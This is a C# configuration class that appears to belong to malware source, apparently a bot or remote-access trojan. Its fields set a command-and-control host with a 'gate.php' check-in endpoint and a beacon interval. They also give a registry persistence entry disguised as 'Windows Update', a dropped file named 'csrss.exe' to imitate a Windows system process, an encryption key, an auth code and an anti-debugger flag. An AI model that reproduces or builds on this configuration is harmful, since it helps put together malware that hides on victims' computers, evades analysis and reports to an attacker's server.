using T.Utilities;

namespace T.Core
{
    class Config
    {
        public static string Host { get; set; }
        public static string Gate { get; set; }
        public static int Interval { get; set; }
        public static string Mutex { get; set; }
        public static string RegistryName { get; set; }
        public static string FileName { get; set; }
        public static string EncryptionKey { get; set; }
        public static string AuthCode { get; set; }
        public static string Version { get; set; }
        public static bool AntiDebuggers { get; set; }

        static Config()
        {
            Host = "http://ver.sx/test/1/";
            Gate = Host + "gate.php";
            Interval = (1 * 60000) / 2;
            Mutex = "1234567890";
            RegistryName = "Windows Update";
            FileName = "csrss.exe";
            EncryptionKey = "test";
            AuthCode = "XYZ";
            Version = SysUtils.ProductVersion;
            AntiDebuggers = true;
        }
    }
}